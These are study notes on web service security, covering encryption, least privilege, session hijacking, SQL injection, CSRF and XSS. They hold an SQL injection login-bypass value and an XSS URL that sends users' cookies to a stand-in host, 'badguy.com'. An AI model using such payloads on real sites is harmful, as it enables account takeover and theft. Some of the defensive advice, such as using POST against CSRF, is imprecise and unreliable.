# [Design Web Service] Security
* Writing notes for learning how to build a secure web service.
* Discuss web server security features.

## Key Questions
- What happens if the file are not encypted?
  - FTP to SFTP
  - HTTP to HTTPS
  - telnet vs SSH
  
  User sessions or important information might sniffs by hackers. For example, people can see sessions in the header of HTTP without using SSL. Then the bad guys will be able to pretend you in the system.

- How about running the programs in different user, instead of root?
  
  - For example, using httpd to run Apache. The bad guy could only use httpd to break down Apache, and the file httpd owns.
  - Using a group to control the read access, sperate the update command for unique users.

    
## Key Threats
- ***User privilege***
  
  Try to be aware of the initial functions that the program users can execute, and keep the privilege on single user. 
	
  - For example, php web server are able to execute files by echo the name of the file. So, we should manupilating in our own code, not to enable some initial function that might cause damage, like sql injections or giving important details.
    
    Something buggy happens, like the bad guy try to delete files, they only could delete the user's only.
    
- ***Stealing info from response***

  Sensitive information should not be seen, etc: version, user tokens.
  
  - Make sure your program in your settings will not leak any critical details.

- ***Session Hijacking***
  - Packet Sniffing
  - Session Fixation (guess the session combinations)
  - XSS (Cross-Site Scripting)
  
  How can we mitigate these threats?
  - Session Encypted - SSL using public cryptography
    
    Buying a domain with SSL from godaddy. We get two unique key. A public key to encrypt the data, which could publicly spread to others. On the other hand, the private key on our server is the only key to decrypt the data.

- ***SQL Injection***
  - Remember to call the protecting functions like mysql real_escape_string() in PHP. It prevents special symbols, like semicolon;. They might even drop your table, if you ignore this risk. 

  - Down below is an bad mysql code, which might give the bad guys a chance to cause damage to your system.

	
  	"SELECT uid From users WHERE username = '%s' AND password='%s'", ...
    
    Giving password %s=123' OR '1'='1'. This case will let the user login without using the real password, since it will return true.
  
  - Django server by using orm will be much safer, or using Python Database API. Both of them have inplement escaping special symbols.
  	
- ***CSRF / XSS (Cross-Site Scripting)***
  
  CSRF
  - Bad guys might use your domain to let people clicking unwittingly, or even trigger simply by visit the bad website. For example, they embed a buying link, which cause the users kept buying specific stocks.
  
  - How do we prevent this happens?
    - Create identifier for some key functions, or we make the action more complex by using POST.
    
  XSS
  - Bad guys might able to implement script to redirect and get users cookie by using same domain as your. For example, provide a web injection by using script tag in there webs down below.
  
	www.eshop.com/?foo=<sript>documemnt.location="badguy.com/..."</srcipt>
    
    The user of eshop's cookie will automatically send to badguys.com, which is a tragety.

    
  